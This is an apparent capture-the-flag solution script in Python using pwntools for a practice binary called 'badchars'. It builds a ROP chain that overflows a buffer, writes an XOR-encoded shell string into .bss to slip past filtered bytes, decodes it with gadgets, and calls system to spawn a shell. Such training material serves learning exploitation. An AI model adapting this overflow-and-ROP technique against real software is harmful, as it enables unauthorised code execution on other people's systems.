from pwn import * 


"""
[Sections]
Nm Paddr       Size Vaddr      Memsz Perms Name
00 0x00000000     0 0x00000000     0 ---- 
01 0x00000238    28 0x00400238    28 -r-- .interp
02 0x00000254    32 0x00400254    32 -r-- .note.ABI_tag
03 0x00000274    36 0x00400274    36 -r-- .note.gnu.build_id
04 0x00000298    48 0x00400298    48 -r-- .gnu.hash
05 0x000002c8   384 0x004002c8   384 -r-- .dynsym
06 0x00000448   151 0x00400448   151 -r-- .dynstr
07 0x000004e0    32 0x004004e0    32 -r-- .gnu.version
08 0x00000500    48 0x00400500    48 -r-- .gnu.version_r
09 0x00000530    96 0x00400530    96 -r-- .rela.dyn
10 0x00000590   264 0x00400590   264 -r-- .rela.plt
11 0x00000698    26 0x00400698    26 -r-x .init
12 0x000006c0   192 0x004006c0   192 -r-x .plt
13 0x00000780     8 0x00400780     8 -r-x .plt.got
14 0x00000790  1074 0x00400790  1074 -r-x .text
15 0x00000bc4     9 0x00400bc4     9 -r-x .fini
16 0x00000bd0   103 0x00400bd0   103 -r-- .rodata
17 0x00000c38    84 0x00400c38    84 -r-- .eh_frame_hdr
18 0x00000c90   372 0x00400c90   372 -r-- .eh_frame
19 0x00000e10     8 0x00600e10     8 -rw- .init_array
20 0x00000e18     8 0x00600e18     8 -rw- .fini_array
21 0x00000e20     8 0x00600e20     8 -rw- .jcr
22 0x00000e28   464 0x00600e28   464 -rw- .dynamic
23 0x00000ff8     8 0x00600ff8     8 -rw- .got
24 0x00001000   112 0x00601000   112 -rw- .got.plt
25 0x00001070    16 0x00601070    16 -rw- .data
26 0x00001080     0 0x00601080    48 -rw- .bss
27 0x00001080    52 0x00000000    52 ---- .comment
28 0x00001bf7   268 0x00000000   268 ---- .shstrtab
29 0x000010b8  2040 0x00000000  2040 ---- .symtab
30 0x000018b0   839 0x00000000   839 ---- .strtab


"""

def xor():
	badchars = [0x62, 0x69, 0x63, 0x2f, 0x20, 0x66, 0x6e, 0x73]
	sh = "/bin/sh\x00"
	print len(sh)
	#Loop 0 to 255
	for i in xrange(255):
		flag = True
		# 8 loops, for 8 bytes we concat the result of the xor
		new_sh = "".join([chr(i^ord(sh[x])) for x in xrange(len(sh))])
		#Now we loop through all 8 bytes of bad chars and if it's found in new string we ignore it
		for b in badchars:
			if chr(b) in new_sh:
				flag = False
		#If we made it past the bad character check we print out the result and exit
		if flag:
			#print "^"+str(i)
			#print new_sh.encode('hex')
			return new_sh.encode('hex')
		
def exploit():

	p = process('./badchars')
	#p = gdb.debug('./badchars', 'b *0x400b40')
	context(os='linux', arch='amd64')
	#context.log_level = 'DEBUG'

	log.success("Sending Exploit")

	xor_gadget = p64(0x400b30) # xor byte ptr [r15], r14b ; ret
	setup_input = p64(0x400b3b) # pop r12 ; pop r13 ; ret
	encode_storage = p64(0x400b40) # pop r14 ; pop r15 ; ret
	pop_rdi = p64(0x400b39) # pop rdi ; ret
	write_what_where = p64(0x400b34) # mov qword ptr [r13], r12 ; ret
	start_write_location = p64(0x601080) # 0x00601080    48 -rw- .bss
	encoded_exec = p64(0x2d606b6c2d716a02, endianness="big") # /bin/bash xor ^ 2
	system = p64(0x4006f0)

	log.success("Writing...")

	pwn = "A" * 40 # overflow
	pwn += setup_input # pop r12 ; pop r13 ; ret
	pwn += encoded_exec # 0x2d606b6c2d716a02
	pwn += start_write_location # 0x00601080    48 -rw- .bss
	pwn += write_what_where # mov qword ptr [r13], r12 ; ret

	log.success("Decoding...")

	for i in range(0, 8 + 1): # loop through each hex value and xor with 2 to decode characters
		pwn += encode_storage # pop r14 ; pop r15 ; ret
		pwn += p64(2) # key
		pwn += p64(0x601080+i) # write location + i (incrementing start write address)
		pwn += xor_gadget # xor byte ptr [r15], r14b ; ret

	log.success("Executing...")

	pwn += pop_rdi # pop rdi ; ret
	pwn += start_write_location # 0x00601080    48 -rw- .bss (beginging of write location)
	pwn += system # system@plt

	p.recvuntil(">")
	p.sendline(pwn)
	p.interactive()

exploit()